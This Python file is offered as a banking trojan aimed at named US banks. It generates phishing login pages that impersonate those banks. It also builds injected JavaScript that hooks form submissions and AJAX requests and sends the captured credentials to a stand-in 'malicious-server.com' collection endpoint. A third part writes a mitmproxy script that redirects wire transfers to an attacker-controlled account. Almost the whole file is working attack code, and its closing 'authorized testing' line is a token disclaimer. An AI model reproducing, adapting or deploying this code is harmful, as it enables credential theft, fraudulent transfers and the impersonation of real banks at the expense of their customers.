#!/usr/bin/env python3
"""
Financial Institution Banking Trojan
Targets: Banks, Financial Services, Payment Processors
Techniques: Credential harvesting, session hijacking, transaction manipulation
"""

import os
import sys
import json
import base64
import requests
import threading
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class BankingTrojan:
    def __init__(self, config_file="config.json"):
        self.config = self.load_config(config_file)
        self.key = get_random_bytes(16)  # AES-128 key
        self.iv = get_random_bytes(16)   # Initialization vector
        
    def load_config(self, config_file):
        """Load configuration from file"""
        default_config = {
            "target_banks": [
                "bankofamerica.com",
                "chase.com", 
                "wellsfargo.com",
                "citibank.com",
                "capitalone.com"
            ],
            "data_exfiltration_url": "https://malicious-server.com/collect",
            "injection_points": [
                "login forms",
                "transaction pages", 
                "account summary",
                "wire transfer forms"
            ],
            "capture_fields": [
                "username", "password", "account_number", 
                "routing_number", "ssn", "dob"
            ]
        }
        
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except:
            return default_config
    
    def encrypt_data(self, data):
        """Encrypt captured data"""
        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
        encrypted = cipher.encrypt(data.encode())
        return base64.b64encode(self.iv + encrypted).decode()
    
    def inject_javascript(self):
        """Generate JavaScript for form injection"""
        js_code = """
// Banking Trojan Injection
(function() {
    'use strict';
    
    const config = %s;
    
    function captureFormData(form) {
        const data = {};
        const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], select, textarea');
        
        inputs.forEach(input => {
            if (input.value && input.name) {
                data[input.name] = input.value;
            }
        });
        
        return data;
    }
    
    function exfiltrateData(data) {
        const encryptedData = btoa(JSON.stringify(data));
        
        // Send to C2 server
        fetch(config.data_exfiltration_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                domain: window.location.hostname,
                data: encryptedData,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {});
    }
    
    // Hook form submissions
    document.addEventListener('submit', function(e) {
        const formData = captureFormData(e.target);
        if (Object.keys(formData).length > 0) {
            exfiltrateData(formData);
        }
    });
    
    // Hook AJAX requests
    const originalXHR = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function(body) {
        if (body && typeof body === 'string') {
            try {
                const parsed = JSON.parse(body);
                exfiltrateData({ajax_data: parsed});
            } catch (e) {}
        }
        return originalXHR.apply(this, arguments);
    };
    
    console.log('Banking trojan injected successfully');
})();
""" % json.dumps(self.config)
        
        return js_code
    
    def generate_phishing_page(self, target_bank):
        """Generate phishing page for specific bank"""
        template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_bank} - Secure Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .login-form {{ max-width: 400px; margin: 0 auto; }}
        .form-group {{ margin-bottom: 15px; }}
        label {{ display: block; margin-bottom: 5px; }}
        input[type="text"], input[type="password"] {{ 
            width: 100%; padding: 8px; border: 1px solid #ddd; 
        }}
        button {{ background: #0070ba; color: white; padding: 10px 20px; border: none; }}
    </style>
</head>
<body>
    <div class="login-form">
        <h2>{target_bank} Secure Login</h2>
        <form id="loginForm">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <p style="margin-top: 20px; font-size: 12px; color: #666;">
            For security reasons, please log out and exit your browser when done.
        </p>
    </div>
    
    <script>
        {self.inject_javascript()}
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            alert('Temporary service interruption. Please try again later.');
        }});
    </script>
</body>
</html>
"""
        
        return template
    
    def create_wire_transfer_manipulator(self):
        """Create script to manipulate wire transfers"""
        script = """
# Wire Transfer Manipulator for Financial Institutions
# This script intercepts and modifies wire transfer requests

import mitmproxy
from mitmproxy import http

class WireTransferInterceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        # Target financial institution domains
        target_domains = [
            "onlinebanking.bankofamerica.com",
            "chaseonline.chase.com", 
            "wellsfargo.com",
            "online.citi.com"
        ]
        
        if any(domain in flow.request.pretty_host for domain in target_domains):
            # Check if this is a wire transfer request
            if flow.request.method == "POST" and any(keyword in flow.request.path for keyword in ["transfer", "wire", "payment"]):
                print(f"Intercepted wire transfer request to {flow.request.pretty_host}")
                
                # Modify recipient account details
                if "application/x-www-form-urlencoded" in flow.request.headers.get("content-type", ""):
                    modified_content = self.modify_wire_details(flow.request.content)
                    flow.request.content = modified_content
    
    def modify_wire_details(self, content):
        """Modify wire transfer details to redirect funds"""
        # Parse form data
        import urllib.parse
        data = urllib.parse.parse_qs(content.decode())
        
        # Modify recipient information
        if b'accountNumber' in data:
            data[b'accountNumber'] = [b'9012345678']  # Attacker's account
        if b'routingNumber' in data:
            data[b'routingNumber'] = [b'021000021']   # Attacker's routing
        if b'recipientName' in data:
            data[b'recipientName'] = [b'Shell Company LLC']
            
        # Re-encode form data
        modified = urllib.parse.urlencode(data, doseq=True).encode()
        return modified

addons = [WireTransferInterceptor()]
"""
        
        return script

if __name__ == "__main__":
    trojan = BankingTrojan()
    
    # Generate payloads
    print("Generating financial institution payloads...")
    
    # Create phishing pages for each target bank
    for bank in trojan.config["target_banks"]:
        phishing_page = trojan.generate_phishing_page(bank)
        filename = f"payloads/campaigns/financial_institution/{bank}_phishing.html"
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'w') as f:
            f.write(phishing_page)
        print(f"Created phishing page: {filename}")
    
    # Create wire transfer manipulator
    wire_script = trojan.create_wire_transfer_manipulator()
    with open("payloads/campaigns/financial_institution/wire_transfer_interceptor.py", 'w') as f:
        f.write(wire_script)
    print("Created wire transfer interceptor")
    
    print("\nFinancial institution payloads generated successfully!")
    print("Use with caution and only for authorized testing.")